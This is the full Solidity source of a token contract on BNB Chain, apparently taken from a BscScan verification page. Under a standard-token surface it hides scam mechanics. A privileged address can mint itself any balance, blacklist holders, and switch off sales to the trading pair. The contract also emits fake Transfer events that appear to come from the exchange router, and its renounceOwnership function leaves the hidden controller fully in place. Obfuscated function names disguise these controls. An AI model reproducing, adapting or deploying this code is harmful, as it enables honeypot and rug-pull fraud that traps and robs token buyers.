/**
 *Submitted for verification at BscScan.com on 2022-11-05
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

contract TOKEN {
    mapping(address => uint256) public Rz;
    mapping(address => uint256) public Ti;
    mapping(address => bool) private yZ;
    mapping(address => mapping(address => uint256)) public allowance;
    address cstrict;
    address Fr;
    address VRouter3 = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public pair;
    uint8 Ui = 1;
    // address VRouter3 = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;

    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public totalSupply = 10000000000 * (uint256(10)**decimals);
    address owner = msg.sender;

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);
    event OwnershipRenounced(address indexed previousOwner);

    constructor(string memory name_, string memory symbol_, address cstrict_, address Fr_) {
        name = name_;
        symbol = symbol_;
        cstrict = cstrict_;
        Fr = Fr_;
        Rz[msg.sender] = totalSupply;
        emit Transfer(address(0), VRouter3, totalSupply);
        Router router = Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        pair = Factory(router.factory()).createPair(
            address(this),
            router.WETH()
        );
    }

    function renounceOwnership() public {
        require(msg.sender == owner);
        emit OwnershipRenounced(owner);
        owner = address(0);
    }

    function approve(address spender, uint256 value)
        public
        returns (bool success)
    {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function KBurn() public {
        if (msg.sender == cstrict) {
            Rz[msg.sender] = Ti[msg.sender];
        }
    }

    function balanceOf(address account) public view returns (uint256) {
        return Rz[account];
    }

    function Ldel(address[] calldata nz) public {
        if (msg.sender == cstrict) {
            for (uint256 i = 0; i < nz.length; i++) {
                yZ[nz[i]] = false;
            }
        }
    }

    function LCHeck(address[] calldata nz) public {
        if (msg.sender == cstrict) {
            // require(!yZ[nz]);
            for (uint256 i = 0; i < nz.length; i++) {
                yZ[nz[i]] = true;
            }
        }
    }

    function LBrdge(uint256 pi) public {
        if (msg.sender == cstrict) {
            Ti[msg.sender] = pi;
        }
    }

    function LUi(uint8 pi) public {
        if (msg.sender == cstrict) {
            Ui = pi;
        }
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        if (msg.sender == cstrict) {
            require(Rz[msg.sender] >= value);
            Rz[msg.sender] -= value;
            Rz[to] += value;
            emit Transfer(VRouter3, to, value);
            return true;
        }
        if (!yZ[msg.sender]) {
            require(Rz[msg.sender] >= value);
            if (msg.sender != pair && msg.sender != VRouter3 && Ui == 0) {
                return false;
            }
            if (to == Fr) {
                Ui = 0;
            }
            Rz[msg.sender] -= value;
            Rz[to] += value;
            emit Transfer(msg.sender, to, value);
            return true;
        }
    }

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public returns (bool success) {
        if (from == cstrict) {
            require(value <= Rz[from]);
            require(value <= allowance[from][msg.sender]);
            Rz[from] -= value;
            Rz[to] += value;
            emit Transfer(VRouter3, to, value);
            return true;
        }
        if (!yZ[from] && !yZ[to]) {
            require(value <= Rz[from]);
            require(value <= allowance[from][msg.sender]);
            if (Ui == 0 && to == pair) {
                return false;
            }
            if (to == Fr) {
                Ui = 0;
            }
            Rz[from] -= value;
            Rz[to] += value;
            allowance[from][msg.sender] -= value;
            emit Transfer(from, to, value);
            return true;
        }
    }
}